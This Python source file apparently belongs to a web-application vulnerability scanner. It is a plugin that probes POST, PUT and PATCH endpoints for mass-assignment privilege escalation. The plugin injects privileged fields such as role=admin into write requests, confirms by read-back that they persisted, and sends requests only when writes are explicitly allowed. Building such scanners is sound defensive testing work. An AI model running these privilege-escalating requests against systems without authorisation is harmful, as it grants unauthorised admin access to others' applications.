"""
mass_assignment — privilege escalation via smuggled fields (target_app's
PUT /users/{id} accepting role=admin).

Effect oracle: send a write with privileged fields injected, then confirm they
were applied — either echoed in the write response or visible on read-back.
"""
from __future__ import annotations

from typing import List

from attacks.base import AttackPlugin, AttackContext, register
from attacks.payloads import MASS_ASSIGNMENT_FIELDS
from core.models import Request, Finding, Evidence, VulnClass, Severity, Confidence


@register
class MassAssignmentPlugin(AttackPlugin):
    vuln_class = VulnClass.MASS_ASSIGNMENT
    name = "mass_assignment"

    def applies_to(self, endpoint) -> bool:
        return endpoint.method in ("POST", "PUT", "PATCH")

    def run(self, ctx: AttackContext) -> List[Finding]:
        ep = ctx.endpoint
        if not ctx.allow_writes:
            return []   # mutates the target — only with an explicit writes opt-in
        anon = ctx.acting()   # the identity we act as (anonymous or authenticated)
        url = ctx.url()

        body = dict(ctx.sample_body or {})
        body.update(MASS_ASSIGNMENT_FIELDS)
        req = Request(ep.method, url, body=body, label="privileged-fields",
                      content_type=ep.request_content_type)
        r = ctx.send(req, anon)

        applied = self._reflected(r, MASS_ASSIGNMENT_FIELDS)

        # If the write didn't echo state, confirm via a GET read-back.
        read_back = None
        if not applied and ep.path_params:
            # PUT/PATCH on a specific resource → re-GET the same path.
            read_back = ctx.send(Request("GET", url, content_type="json", label="read-back"), anon)
            applied = self._reflected(read_back, MASS_ASSIGNMENT_FIELDS)
        if not applied and not ep.path_params:
            # POST to a collection → resolve the new id and read it back via GET-by-id.
            read_back = self._collection_readback(ctx, r)
            applied = self._reflected(read_back, MASS_ASSIGNMENT_FIELDS)

        if applied:
            ctx.log(f"mass_assignment: {ep.key} applied {applied}")
            shown = ", ".join(f"{k}={v}" for k, v in applied.items())
            return [Finding(
                vuln_class=self.vuln_class,
                severity=Severity.CRITICAL,
                confidence=Confidence.HIGH,
                title=f"Mass assignment / privilege escalation on {ep.key}",
                endpoint_key=ep.key,
                identity=anon.name,
                detail=(f"A write including privileged fields was accepted and applied ({shown}). "
                        f"The endpoint does not restrict which fields a client may set, so a user "
                        f"can grant themselves elevated privileges."),
                evidence=Evidence(request=req, response=r if read_back is None else read_back,
                                  note="privileged fields persisted" + (" (confirmed on read-back)" if read_back else "")),
                source=self.name,
            )]
        return []

    def _collection_readback(self, ctx: AttackContext, write_resp):
        """After a POST that creates a resource, GET it back at its canonical id route."""
        ep = ctx.endpoint
        # Resolve the created id from the response body or a Location header.
        new_id = None
        if isinstance(write_resp.body, dict):
            for k in ("id", "_id", "uuid", "pk"):
                if write_resp.body.get(k) not in (None, ""):
                    new_id = str(write_resp.body[k])
                    break
        if not new_id:
            loc = str((write_resp.headers or {}).get("location", ""))
            if loc:
                new_id = loc.rstrip("/").split("/")[-1] or None
        if not new_id:
            return None
        resource = [p for p in ep.path_template.split("/") if p and not p.startswith("{")]
        resource = resource[-1] if resource else ""
        # Find a GET-by-id endpoint for the same resource.
        for ge in ctx.surface:
            if ge.method != "GET" or not ge.path_params:
                continue
            gres = [p for p in ge.path_template.split("/") if p and not p.startswith("{")]
            if (gres[-1] if gres else "") != resource:
                continue
            pname = ge.path_params[0]["name"]
            return ctx.send(Request("GET", ge.url_for({pname: new_id}),
                                    content_type="json", label="collection-read-back"), ctx.acting())
        return None

    @staticmethod
    def _reflected(resp, fields: dict) -> dict:
        # Structured (JSON) read-back only — matching loose strings in an HTML page would
        # invite false positives. The canonical GET-by-id read-back returns JSON.
        if resp is None or not isinstance(resp.body, dict):
            return {}
        return {k: v for k, v in fields.items() if str(resp.body.get(k)) == str(v)}
